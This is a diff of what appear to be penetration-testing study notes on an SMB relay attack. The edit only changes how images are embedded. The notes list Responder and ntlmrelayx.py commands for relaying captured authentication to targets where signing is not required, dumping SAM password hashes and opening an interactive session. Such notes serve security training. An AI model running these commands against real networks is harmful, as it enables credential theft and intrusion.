@@ -5,7 +5,7 @@
     
     - want to see “Message signing enabled but not required”
     
-![[../assets/SMB Relay/Untitled 14.png|Untitled 14.png]]
+![Untitled 14.png](../assets/SMB%20Relay/Untitled%2014.png)
 - Step 1: Run Responder
     
     - For SMB Relay, we want SMB and HTTP to be OFF (unlike LLMNR poisoning)
@@ -15,19 +15,19 @@
     
     - sudo responder -I tun0 -dP
     
-![[/Untitled 1 3.png|Untitled 1 3.png]]
+![Untitled 1 3.png](/Untitled%201%203.png)
 - Step 2: Set up your relay
     
     - sudo [ntlmrelayx.py](http://ntlmrelayx.py) -tf targets.txt -smb2support
     
-![[/Untitled 2 3.png|Untitled 2 3.png]]
+![Untitled 2 3.png](/Untitled%202%203.png)
 - Step 3: An event occurs
-![[/Untitled 13.png|Untitled 13.png]]
+![Untitled 13.png](/Untitled%2013.png)
 - Step 4: Win 🙂
     
     - dumps SAM hashes
     
-![[/Untitled 3 3.png|Untitled 3 3.png]]
+![Untitled 3 3.png](/Untitled%203%203.png)
   
 Other Wins
 - sudo [ntlmrelayx.py](http://ntlmrelayx.py) -tf targets.txt -smb2support -i
